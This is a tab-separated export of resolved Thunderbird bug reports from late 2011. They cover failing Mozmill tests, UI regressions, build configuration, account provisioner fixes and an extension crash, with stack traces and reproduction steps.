701005%TAB%1320817248%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-header-toolbar.js | test_customize_header_toolbar_reorder_buttons, test_customize_header_toolbar_separate_window, test_customize_header_toolbar_remove_buttons%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-header-toolbar.js | test_customize_header_toolbar_reorder_buttons, test_customize_header_toolbar_separate_window, test_customize_header_toolbar_remove_buttonsThis just showed up during the dogpile of patches yesterday.  Experience tells me that these three oranges are likely related, hence why I bound them into a single bug.  SUMMARY-UNEXPECTED-FAIL | test-header-toolbar.js | test_customize_header_toolbar_reorder_buttons   EXCEPTION: a != b: 'hdrReplyToSenderButton,hdrSmartReplyButton,hdrForwardButton,hdrArchiveButton,hdrJunkButton,hdrTrashButton' != 'hdrTrashButton,hdrJunkButton,hdrArchiveButton,hdrForwardButton,hdrSmartReplyButton,hdrReplyToSenderButton'.     at: test-folder-display-helpers.js line 2842        assert_true(false,"a != b: 'hdrReplyToSenderButton,hdrSmartReplyButton,hdrForwardButton,hdrArchiveButton,hdrJunkButton,hdrTrashButton' != 'hdrTrashButton,hdrJunkButton,hdrArchiveButton,hdrForwardButton,hdrSmartReplyButton,hdrReplyToSenderButton'.") test-folder-display-helpers.js 2842        assert_equals("hdrReplyToSenderButton,hdrSmartReplyButton,hdrForwardButton,hdrArchiveButton,hdrJunkButton,hdrTrashButton","hdrTrashButton,hdrJunkButton,hdrArchiveButton,hdrForwardButton,hdrSmartReplyButton,hdrReplyToSenderButton") test-folder-display-helpers.js 2829        test_customize_header_toolbar_reorder_buttons() test-header-toolbar.js 195             frame.js 554             frame.js 623             frame.js 666             frame.js 494             frame.js 672             server.js 182             server.js 186  SUMMARY-UNEXPECTED-FAIL | test-header-toolbar.js | test_customize_header_toolbar_separate_window   EXCEPTION: a != b: 'hdrReplyToSenderButton,hdrSmartReplyButton,hdrForwardButton,hdrArchiveButton,hdrJunkButton,hdrTrashButton' != 'hdrTrashButton,hdrJunkButton,hdrArchiveButton,hdrForwardButton,hdrSmartReplyButton,hdrReplyToSenderButton'.     at: test-folder-display-helpers.js line 2842        assert_true(false,"a != b: 'hdrReplyToSenderButton,hdrSmartReplyButton,hdrForwardButton,hdrArchiveButton,hdrJunkButton,hdrTrashButton' != 'hdrTrashButton,hdrJunkButton,hdrArchiveButton,hdrForwardButton,hdrSmartReplyButton,hdrReplyToSenderButton'.") test-folder-display-helpers.js 2842        assert_equals("hdrReplyToSenderButton,hdrSmartReplyButton,hdrForwardButton,hdrArchiveButton,hdrJunkButton,hdrTrashButton","hdrTrashButton,hdrJunkButton,hdrArchiveButton,hdrForwardButton,hdrSmartReplyButton,hdrReplyToSenderButton") test-folder-display-helpers.js 2829        test_customize_header_toolbar_separate_window() test-header-toolbar.js 252             frame.js 554             frame.js 623             frame.js 666             frame.js 494             frame.js 672             server.js 182             server.js 186  SUMMARY-UNEXPECTED-FAIL | test-header-toolbar.js | test_customize_header_toolbar_remove_buttons   EXCEPTION: a != b: '__empty' != 'hdrReplyToSenderButton,hdrSmartReplyButton,hdrForwardButton,hdrArchiveButton,hdrJunkButton,hdrTrashButton'.     at: test-folder-display-helpers.js line 2842        assert_true(false,"a != b: '__empty' != 'hdrReplyToSenderButton,hdrSmartReplyButton,hdrForwardButton,hdrArchiveButton,hdrJunkButton,hdrTrashButton'.") test-folder-display-helpers.js 2842        assert_equals("__empty","hdrReplyToSenderButton,hdrSmartReplyButton,hdrForwardButton,hdrArchiveButton,hdrJunkButton,hdrTrashButton") test-folder-display-helpers.js 2829        test_customize_header_toolbar_remove_buttons() test-header-toolbar.js 358
700993%TAB%1320811613%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Chrome tabs broken after landing of bug 677421%TAB%Chrome tabs broken after landing of bug 677421Opening chrome tabs is broken. shouldSwitchTo expects a contentPage property, when forwarding the call from the chrome tab type, the parameter is named chromePage, not contentPage.
700947%TAB%1320789493%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Hide Test Pilot Feedback button on Aurora until input.mozilla.org works for Thunderbird%TAB%Hide Test Pilot Feedback button on Aurora until input.mozilla.org works for ThunderbirdSince I gather input.mozilla.org isn't set up to handle Thunderbird's Test Pilot, we should turn off the Feedback button for now. Here's a simple patch to do this.
700657%TAB%1320732299%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-instrument-setup.js | test_mail_account_setup%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-instrument-setup.js | test_mail_account_setupThis just started showing up after Account Provisioner landed (bug 686347):  SUMMARY-UNEXPECTED-FAIL | test-instrument-setup.js | test_mail_account_setup   EXCEPTION: Timed out waiting for window open!     at: utils.js line 429        TimeoutError("Timed out waiting for window open!") utils.js 429        waitFor((function () this.monitorizeOpen()),"Timed out waiting for window open!",10000,100,[object Object]) utils.js 467        WindowWatcher_waitForWindowOpen("mail:autoconfig") test-window-helpers.js 290        wait_for_existing_window("mail:autoconfig") test-window-helpers.js 552        test_mail_account_setup() test-instrument-setup.js 82             frame.js 554             frame.js 623             frame.js 666             frame.js 494             frame.js 672             server.js 182             server.js 186  My working theory is that the Account Provisioner window is coming up instead of the Exiting Account dialog.  I'll know more in a few minutes.
700650%TAB%1320730144%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Switch to official mail account provider URLs in all-thunderbird.js%TAB%Switch to official mail account provider URLs in all-thunderbird.jsWe're currently querying for account provisioner provider information from bwinton.latte.ca.  We need to switch those over to the official channels.
700627%TAB%1320724352%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Add ast to all-locales for Aurora%TAB%Add ast to all-locales for AuroraFollowing the merges today, we'll be ready to add ast to all-locales on the aurora branch. We'll then do a phased roll-out.
700536%TAB%1320687627%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Account provisioner polish, and x.browser bug in uriListener.js%TAB%Account provisioner polish, and x.browser bug in uriListener.jsGoing through the account provisioner process, and setting a default search engine, this error shows up in the console:  Warning: reference to undefined property x.browser Source File: chrome://messenger/content/newmailaccount/uriListener.js Line: 97  Likely, we just need to make sure x has a browser before doing the equality check on line 97.  There's also some room for polish on some of the provisioner code.  I'll try to take care of some of that here.
700535%TAB%1320687331%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Mail Window Front End%TAB%Need to be able to pref off account provisioner%TAB%Need to be able to pref off account provisionerIt's great that we're landing this feature, but it'd be a good idea to be able to pref it off in case something goes sour during it's stabilization in EarlyBird.
700292%TAB%1320645961%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Address Book%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-address-book.js | test_writing_to_mailing_list%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-address-book.js | test_writing_to_mailing_listLooking at tbpl, it looks like this permanent orange was likely introduced by the patch for bug https://bugzilla.mozilla.org/show_bug.cgi?id=609245 here:  http://hg.mozilla.org/comm-central/rev/a68fc7427f0d  Strangely, 32-bit Linux doesn't appear to be affected by this one.  Here's a copy of the message:  SUMMARY-UNEXPECTED-FAIL | e:\buildbot\comm-central-win32-opt-unittest-mozmill\build\mozmill\addrbook\test-address-book.js | test_writing_to_mailing_list   EXCEPTION: a == b: '-1' == '-1'.     at: test-folder-display-helpers.js line 2842        assert_true(false,"a == b: '-1' == '-1'.") test-folder-display-helpers.js 2842        assert_not_equals(-1,-1) test-folder-display-helpers.js 2836        test_writing_to_mailing_list() test-address-book.js 389             frame.js 554             frame.js 623             frame.js 666             frame.js 494             frame.js 672             server.js 182             server.js 186
700220%TAB%1320609951%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Multi-message summary broken after bug 397424%TAB%Multi-message summary broken after bug 397424The commit for bug 397472[1] completely broke the multi-message summaries because it changes the name of the monthDate string to monthDate2. Let's fix it.
700054%TAB%1320493045%TAB%107733%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Emoticons not displayed in pull-down menu using GNOME desktop%TAB%Emoticons not displayed in pull-down menu using GNOME desktopThe Emoticons are not displayed with their descriptions on the pull-down menu in the mail compose window of both Thunderbird 7.0.1 and SeaMonkey 2.5b3, when using the GNOME desktop in Linux.  Linux distribution is Debian 6.0.3 (Squeeze), 32-bit (i686).  When using either TB or SM with the XFCE or LXDE desktops, the emoticons display as expected.
699825%TAB%1320395142%TAB%217596%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Mail Window Front End%TAB%Ensure valid 3pane layout pref value, UI fail if not.%TAB%Ensure valid 3pane layout pref value, UI fail if not.need to ensure the value is valid, since manual or extension change to invalid value results in UI failure  I'm not sure I agree with this. Have we had a case of an extension incorrectly setting this value?  Generally with manual setting, users do so at their own risk, so if they set the value wrong, that's up to them.  What I'm concerned about is if we start taking these checks for all our various prefs, we're going to start having a lot of redundant checking all over the code base.
698925%TAB%1320158708%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Message Compose Window,FileLink%TAB%add support for sending attachments via the cloud%TAB%add support for sending attachments via the cloudleaving hidden while we work out some details... start of a component category system for registering cloud file providers. My plan is to flesh out the YouSendIt component just to start somewhere, and see how the prototyping goes.
698702%TAB%1320114332%TAB%69594%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Symbol packaging problem in Socorro symbol store%TAB%Symbol packaging problem in Socorro symbol storeSince the Thunderbird 10.1 nightly with buildID 20111026030412 we've been getting messages from the script that cleans up the symbol store for Socorro (once a day). The most recent message is:  Missing symbols found. Symbol thunderbird.sym from thunderbird-10.0a1-Darwin-20111026030412-symbols.txt is not readable. Symbol thunderbird.dSYM.tar.bz2 from thunderbird-10.0a1-Darwin-20111026030412-symbols.txt is not readable. Symbol thunderbird.sym from thunderbird-10.0a1-Darwin-20111026030412-symbols.txt is not readable. Symbol thunderbird.dSYM.tar.bz2 from thunderbird-10.0a1-Darwin-20111026030412-symbols.txt is not readable. Symbol thunderbird.sym from thunderbird-10.0a1-Darwin-20111027050625-symbols.txt is not readable. Symbol thunderbird.dSYM.tar.bz2 from thunderbird-10.0a1-Darwin-20111027050625-symbols.txt is not readable. Symbol thunderbird.sym from thunderbird-10.0a1-Darwin-20111027050625-symbols.txt is not readable. Symbol thunderbird.dSYM.tar.bz2 from thunderbird-10.0a1-Darwin-20111027050625-symbols.txt is not readable. Symbol thunderbird.sym from thunderbird-10.0a1-Darwin-20111028030017-symbols.txt is not readable. Symbol thunderbird.dSYM.tar.bz2 from thunderbird-10.0a1-Darwin-20111028030017-symbols.txt is not readable. Symbol thunderbird.sym from thunderbird-10.0a1-Darwin-20111028030017-symbols.txt is not readable. Symbol thunderbird.dSYM.tar.bz2 from thunderbird-10.0a1-Darwin-20111028030017-symbols.txt is not readable. Symbol thunderbird.sym from thunderbird-10.0a1-Darwin-20111031030018-symbols.txt is not readable. Symbol thunderbird.dSYM.tar.bz2 from thunderbird-10.0a1-Darwin-20111031030018-symbols.txt is not readable. Symbol thunderbird.sym from thunderbird-10.0a1-Darwin-20111031030018-symbols.txt is not readable. Symbol thunderbird.dSYM.tar.bz2 from thunderbird-10.0a1-Darwin-20111031030018-symbols.txt is not readable.  Looking at the first symbol manifest (thunderbird-10.0a1-Darwin-20111026030412-symbols.txt) it has thunderbird/273358BB1F13F8B5FFAA975AE07B1A850/thunderbird.sym thunderbird/273358BB1F13F8B5FFAA975AE07B1A850/thunderbird.dSYM.tar.bz2 thunderbird/F832A0E8DC387EE719A15F6862B3A5390/thunderbird.sym thunderbird/F832A0E8DC387EE719A15F6862B3A5390/thunderbird.dSYM.tar.bz2 thunderbird-bin/273358BB1F13F8B5FFAA975AE07B1A850/thunderbird-bin.sym thunderbird-bin/273358BB1F13F8B5FFAA975AE07B1A850/thunderbird-bin.dSYM.tar.bz2 thunderbird-bin/F832A0E8DC387EE719A15F6862B3A5390/thunderbird-bin.sym thunderbird-bin/F832A0E8DC387EE719A15F6862B3A5390/thunderbird-bin.dSYM.tar.bz2  And indeed none of the thunderbird/ files exist, but the thunderbird-bin ones do. Seems likely that  http://hg.mozilla.org/comm-central/rev/7582d11356ff is the cause. Perhaps there is some symbol/packaging code that means we don't hit this for Firefox, but do for Thunderbird
698451%TAB%1320047473%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%include hyphenation dictionaries in omnijar - remove old files from builds on update.%TAB%include hyphenation dictionaries in omnijar - remove old files from builds on update.Bug 692743 has included the hyphenation dictionaries in omnijar, but we need to remove them from the Thunderbird build.
698405%TAB%1320037936%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Permanent Orange: TEST-UNEXPECTED-FAIL | test-plugin-crashing.js | setupModule%TAB%Permanent Orange: TEST-UNEXPECTED-FAIL | test-plugin-crashing.js | setupModuleThe test seems to fail out here:  TEST-START | e:\buildbot\comm-central-win32-opt-unittest-mozmill\build\mozmill\content-tabs\test-plugin-crashing.js | setupModule Test Failure: Component returned failure code: 0x80004005 (NS_ERROR_FAILURE) [nsICrashReporter.submitReports] NEXT ERROR TEST-UNEXPECTED-FAIL | e:\buildbot\comm-central-win32-opt-unittest-mozmill\build\mozmill\content-tabs\test-plugin-crashing.js | setupModule TEST-START | e:\buildbot\comm-central-win32-opt-unittest-mozmill\build\mozmill\content-tabs\test-plugin-crashing.js | test_can_crash_plugin Test Skipped: "setupModule failed." WARNING | test_can_crash_plugin | (SKIP) setupModule failed. TEST-START | e:\buildbot\comm-central-win32-opt-unittest-mozmill\build\mozmill\content-tabs\test-plugin-crashing.js | test_crashed_plugin_notification_bar Test Skipped: "setupModule failed."
698374%TAB%1320031220%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Port bug 476430 - Make third-party add-ons disabled on startup, and allow users to activate them%TAB%Port bug 476430 - Make third-party add-ons disabled on startup, and allow users to activate themBug 476430 implemented disabling of third-party installed add-ons. We've picked up most of this by default, but we didn't pick up the UI that prompts the user for add-ons that are third-party installed after the initial third-party prompt.  If we don't pick up this code then a third-party app may install an add-on but it'll just get disabled by default and the user won't be prompted.  The attached patch is a port of the browser parts of the main landing:  http://hg.mozilla.org/mozilla-central/rev/eee41544cb84  I've also included appropriate pref changes so that our unit tests still work.  We need this for TB 8, so looking for review in the next couple of hours so we can get it in the final beta.  To test, download an add-on and place it in the extensions directory in the application folder or the user folder. Note that the name must match the extension id in the install.rdf with .xpi on the end, e.g. for DOM inspector this would be "inspector@mozilla.org.xpi".  Then start up Thunderbird, at which point you'll get a separate tab on the main window opened which allows you to choose to install the add-on or not.  Try server push here just to sanity check that our tests aren't broken with this:
698272%TAB%1319955261%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Long attachment file name screw up message reader UI for messages with single attachment,Long attachment file name screws up message reader UI for messages with single attachment%TAB%Long attachment file name screw up message reader UI for messages with single attachment,Long attachment file name screws up message reader UI for messages with single attachmentRegression (works in TB 7, broken on trunk, didn't check other versions): For messages with a single attachment, attachment file names that are longer than the dedicated space on the attachment pane header will screw up the whole message reader UI by pushing message header and message body to the right beyond the screen.  STR  1) from main 3-pane, view message with single attachment which has a long file name 2) drag the border of the folder pane to the right to reduce the width of message list and message preview  Actual result - we no longer truncate the middle of the clickable attachment file name on attachment header bar (regression, works in TB 7, broken on trunk, didn't check other versions) - message header and message body are pushed to the right beyond the screen -> whole UI is screwed up  Expected result - truncate the middle of long attachment file name on attachment header bar (as we do in TB 7) - thus avoid all the screwed-UI problems
698238%TAB%1319916953%TAB%135518%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Preferences%TAB%test-font-chooser.js fails on Windows after bug 454532%TAB%test-font-chooser.js fails on Windows after bug 454532Happy: http://hg.mozilla.org/mozilla-central/rev/09780321b235 Sad: http://hg.mozilla.org/mozilla-central/rev/1c7e1db3645b (the merge from inbound that included bug 454532's "thou shalt have no Courier save Courier New")  http://tinderbox.mozilla.org/showlog.cgi?log=ThunderbirdTrunk/1319946748.1319947301.9044.gz  SUMMARY-UNEXPECTED-FAIL | e:\buildbot\comm-central-win32-opt-unittest-mozmill\build\mozmill\pref-window\test-font-chooser.js | test_font_name_displayed   EXCEPTION: The monospace font should be Courier, but is actually Courier New.     at: test-font-chooser.js line 97        assert_fonts_equal("monospace","Courier","Courier New") test-font-chooser.js 97        verify_advanced([object Object]) test-font-chooser.js 121             frame.js 549        WindowWatcher_notify([object XPCWrappedNative_NoHelper]) test-window-helpers.js 357
698077%TAB%1319799942%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%You can only "Don't Save" a message once on quit%TAB%You can only "Don't Save" a message once on quitThis was noticed by NeilAway when porting bug 682581 to suite.  Steps to reproduce:  1)  Open two compose windows, and write into each one 2)  In the TB main window, go to File > Quit 3)  In the second compose window, in the confirm prompt that comes up, choose "Don't Save" 4)  In the first compose window, choose "Cancel" 5)  The quit was canceled.  Now try closing the second window.  What happens?  The second window closes without prompting the user.  What's expected?  The window should prompt the user whether or not they want to save, or not save.
697964%TAB%1319772401%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Port bug 665196 (submit crash report & reload plugin in one step) and bug 688083 (sync submit crash report checkbox between instances) to Thunderbird%TAB%Port bug 665196 (submit crash report & reload plugin in one step) and bug 688083 (sync submit crash report checkbox between instances) to ThunderbirdThe two bugs we need to port broke our unit tests.  I've ported the changes but I suspect our unit tests may still be broken, but I can't test that on my Mac at the moment.
697413%TAB%1319603523%TAB%422232%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Usage of progress bar for visualizing imap quota is irritating,Usage of progress bar for visualizing imap quota is irritating - details window only%TAB%Usage of progress bar for visualizing imap quota is irritating,Usage of progress bar for visualizing imap quota is irritating - details window onlyUser Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:7.0.1) Gecko/20100101 Firefox/7.0.1 Build ID: 20110928134238  Steps to reproduce:  Tested under Mac OS X (10.6.8) with v7.0.1 Open an IMAP email account with given quota of 500MB   Actual results:  in the status bar at the bottom of the main window, a progress bar indicates the amount of the quota that is consumed in the account already. The amount percent value is correct, but the progress bar's permanent animation is irritating     Expected results:  since the described issue is not actually a running process but a rather static value indicator, this should imho not use a progress bar but another more appropriate UI element
697125%TAB%1319524296%TAB%397832%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists,Message Reader UI%TAB%Attachments: single attachment opens on single click, multiple attachments need double click%TAB%Attachments: single attachment opens on single click, multiple attachments need double clickUser Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; Avant Browser; Avant Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)  Steps to reproduce:  I received a message with either a single or with multiple attachments.   Actual results:  If there is a single attachment then you only click once to open, but if there are multiple then you need to open the indicator (goes also with single click) and then you must doubleclick on each attachment to open it. If you doubleclick on a single attachment, 2 instances of the handling application start (eg. Acrobat Reader) showing the *same* attachment.   Expected results:  I expected to use a doubleclick only also for opening single attachment. This is consistent with the rest of Windows.
697013%TAB%1319487523%TAB%219126%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Disability Access%TAB%Change about window to be an accessible dialog and put all relevant static info into its acc description%TAB%Change about window to be an accessible dialog and put all relevant static info into its acc descriptionThis will make the About dialog more accessible to screen reader users. It was done for Firefox in bug 694266. These changes should be ported to Thunderbird.
696689%TAB%1319386571%TAB%428159%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%RSS sub-folders do not update%TAB%RSS sub-folders do not updateUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1 Build ID: 20110928134238  Steps to reproduce:  Right-click on main level RSS folder name, select "Get Messages".   Actual results:  Nothing.   Expected results:  All subfolders and their subfolders should have updated.  Instead, I have to go to each folder and manually right-click to select "Get Messages", then they update.  That's a whole lot of clicking.
696621%TAB%1319308738%TAB%287320%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%Inadvertent global variable creation in mail/base/content/folderPane.js%TAB%Inadvertent global variable creation in mail/base/content/folderPane.jsAn add-on which I recently wrote was fully reviewed,but the reviewer (Kent James) commented as follows:  Interesting little issue: We normally don't allow addons to add new unnamespaced global variables to global windows. However, running your addon causes several new names, including "acct" and "folderWithFlag" that comes from bugs in the core folderPane.js with code like this:    for each (folderWithFlag in fixIterator(foldersWithFlag.enumerate()  which should be   for each (let folderWithFlag in fixIterator(foldersWithFlag.enumerate()  I'm not sure if that code is ever run in standard TB 8 with the folder switch feature removed.  If it isn't, then technically your code does not meet our AMO standards. Hmmm... at least for now I'll ignore this.  The patch I'm about to attach (submitting the bug first to get the bug # so I can put it in the patch title) fixes the inadvertent global variable creations in folderPane.js.
696445%TAB%1319190792%TAB%305876%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%make package-tests should include reftests%TAB%make package-tests should include reftestsTo be able to run reftests/crashtests as per bug 485032, comm-central's make package-tests target needs to include the reftest suite. Currently, it only includes xpcshell, mozmill and mochitest
696421%TAB%1319185515%TAB%384947%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Release Engineering,Build Config%TAB%Enable optimization for debug builds%TAB%Enable optimization for debug buildsFirefox have enabled optimization for their debug builds to make tests run faster and Thunderbird should consider doing the same.  standard8 suggested we start with enabling optimizations on try server.
696414%TAB%1319184161%TAB%362792%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Attached vCard throws error message last is undefined%TAB%Attached vCard throws error message last is undefinedIf I open a message with an attached vCard, I get the following error message in the Error Console of Thunderbird:  Error: last is undefined Source File: chrome://messenger/content/msgHdrViewOverlay.js Line: 629  1. Create a New Profile 2. Add POP or IMAP account 3. Create a New Message and attach a vCard ("File -> Attach -> vCard") 4. "File -> Send Later" 5. Open the message in the Outbox ("Local Folders -> Outbox") 6. Open the Error Console ("Tools -> Error Console")  Arch Linux / Thunderbird 7.0.1
696347%TAB%1319159165%TAB%362792%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End,Database,Folder and Message Lists%TAB%Compact Folders throws error message cmd_compactFolder,Compact Folders throws error message cmd_compactFolder. TypeError: this._resetThreadPane is not a function%TAB%Compact Folders throws error message cmd_compactFolder,Compact Folders throws error message cmd_compactFolder. TypeError: this._resetThreadPane is not a functionIf I try to compact all folders of the current account using "File -> Compact Folders", I get an error message in the Error Console of Thunderbird. (However, the actual compacting is done successfully.)  1. Create a New Profile 2. Add POP account 3. Select any folder, e.g. "Local Folders -> Outbox" 4. "File -> Compact Folders" 5. Open the Error Console ("Tools -> Error Console")  Error: An error occurred executing the cmd_compactFolder command: TypeError: this._resetThreadPane is not a function Source File: chrome://global/content/globalOverlay.js Line: 100  Arch Linux / Thunderbird 7.0.1
695468%TAB%1318935295%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Upgrade to MozMill 1.5.5 for Thunderbird,Upgrade to MozMill 1.5.6 for Thunderbird%TAB%Upgrade to MozMill 1.5.5 for Thunderbird,Upgrade to MozMill 1.5.6 for ThunderbirdMost notably it fixes bug 690154, which should help out protz in particular and test writers in general.
695312%TAB%1318912407%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%TEST-UNEXPECTED-FAIL | (runtestlist.py) | Exited with code 1 during directory run during Mozmill test addrbook/test-address-book.js%TAB%TEST-UNEXPECTED-FAIL | (runtestlist.py) | Exited with code 1 during directory run during Mozmill test addrbook/test-address-book.jsSince landing the fix for writing to mailing lists, we've had test failures on beta.  Turns out that this is because the test I wrote for this fix relies on Controller.eid, which I believe is only automatically available in the Mozmill version that we have in trunk / Aurora.  The solution was to write a helper function for getting the address book controller, and using augment_controller from the window helpers for it.  Patch forthcoming.
694890%TAB%1318780893%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Subject and date labels don't line up%TAB%Subject and date labels don't line upThe subject and date labels in the message header don't have the same Y position. Let's fix this.  While we're here, we should probably straighten up the CSS a bit, since it's pretty messy. For instance, do we really want line-height: 1.5em on the rows?  Note that the screenshot shows Linux, but this applies to Windows (XP and 7) as well. I wouldn't be surprised if Mac were also affected, but I don't have a Mac to test this on.
694793%TAB%1318685894%TAB%339434%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Missing notcached.title element in DTD.%TAB%Missing notcached.title element in DTD.As seen in http://dl.dropbox.com/u/2301433/Screenshots/Missing%20Element.png  Daily Channel, version 10.0a1 (2011-10-14).  (Possibly fixed by bug 653386?) Having taken a look at bug 653386, it is more complicated than I thought, as it turns out we either have to fix or at least move some strings in core.  Therefore I'm taking the simpler option of just patching what we have for this bug for now.
694409%TAB%1318506698%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Suppress Telemetry notification on Mozmill tests%TAB%Suppress Telemetry notification on Mozmill testsIn the same vein as bug 638605, we don't want the Telemetry opt-in prompt in our Mozmill tests. On a side note, there's a least one case (bug 690319) where the Telemetry prompt caused some focus issues, thus leading to some random oranges.  This patch *might* clear some of the oranges that have been cropping up lately.
692735%TAB%1317945479%TAB%155325%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Crash exporting messages in HTML format with ImportExportTools%TAB%Crash exporting messages in HTML format with ImportExportToolsUser Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.9.2.21) Gecko/20110830 Firefox/3.6.21 Build ID: 20110830092825  Steps to reproduce:  I'm the developer of ImportExportTools extension. Many users wrote to me, about a crash they get when trying to export messages in HTML format. The crash happens after a random number of messages and just with Thunderbird 5 or higher. All my reports come from Windows or MAC users and I can't reproduce this bug in any way on my Linux machine.  Crash logs (I've just few) have all many references to  "%SystemRoot%\system32\mswsock.dll" , you can find it a couple here:  http://services.gxware.org/nopaste/?3673 http://services.gxware.org/nopaste/?3674  All crash reports I got, seem to fall into this crash:   https://crash-stats.mozilla.com/report/list?product=Thunderbird&query_search=signature&query_type=exact&query=XPC_WN_NoHelper_Finalize&reason_type=contains&date=10%2F07%2F2011%2001%3A14%3A11&range_value=1&range_unit=weeks&hang_type=any&process_type=any&do_query=1&signature=XPC_WN_NoHelper_Finalize  All users report that crash happens just exporting in HTML/plain-text format, but not in EML format. The code for export in HTML is very similar to the code for export in EML.  The only difference is that EML export is done just through with a simple call to   messengerService.streamMessage(msguri, myEMLlistner, msgWindow, null, false, null);  while HTML export is performed with  var nschannel =  Components.classes["@mozilla.org/network/input-stream-channel;1"]    	  .createInstance(Components.interfaces.nsIInputStreamChannel); nschannel.setURI(nsURI); var streamConverterService = Components.classes["@mozilla.org/streamConverters;1"]    	   	  .getService(Components.interfaces.nsIStreamConverterService); var streamListner=streamConverterService.asyncConvertData("message/rfc822", "text/html", myTxtListener, nschannel); messageService.streamMessage(uri, streamListner, msgWindow, null, false, null);		  The rest of the code is pretty identical, so I guess that the crash is caused by nschannel.setURI(nsURI) or by the asyncConverter.  Notice that it seems have a close relation with https://bugzilla.mozilla.org/show_bug.cgi?id=682916, so this crash could be a symptom of a very frequent problem, present also on Firefox.  Steps to reproduce:  - install ImportExportTools extension, version 2.6.2.2 (attached here) - try to export a large number of messages in HTML format, with Thunderbird 5 or higher - after a random number of messages, sometimes you'll get a crash of Thunderbird  I'm contact with some users that can help us and me to debug this problem, so tell me which tests can be useful.
692616%TAB%1317907512%TAB%334226%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%large images not be scaled down to windows size%TAB%large images not be scaled down to windows sizeUser Agent: Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0 Build ID: 20110928060149  Steps to reproduce:  I send a plain text email to myself with an attachment (jpg)  of more than 3 MB. View > Display Attachments inline is activated. The Thunderbird window is maximized. I open the received in the message preview window or standalone message windows. I scroll down to the bottom of the message body to see the attached image file.   Actual results:  The image is larger than the actual window and has to be scrolled horizontally. Now I click on the max/normal button right on top. The window becomes smaller and the horizontal scroll bar disappear. The image has become the size of the window.  Clicking again on the button maximize the window and the image is still scaled down. Changing to another email and back again I have to do the same procedure. It's not important if the first window is maximized or normal.   Expected results:  The image should be scaled down immediately without any other action. It should have same behaviour as in TB 3.1 which works fine.
692473%TAB%1317884407%TAB%305876%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Add profiledbuild to the targets that qualify for auto-running client.py%TAB%Add profiledbuild to the targets that qualify for auto-running client.pyJust noticed in new-try that client.py doesn't get auto-invoked, because instead of:  make -f client.mk build  these win32 builds build with:  make -f client.mk profiledbuild
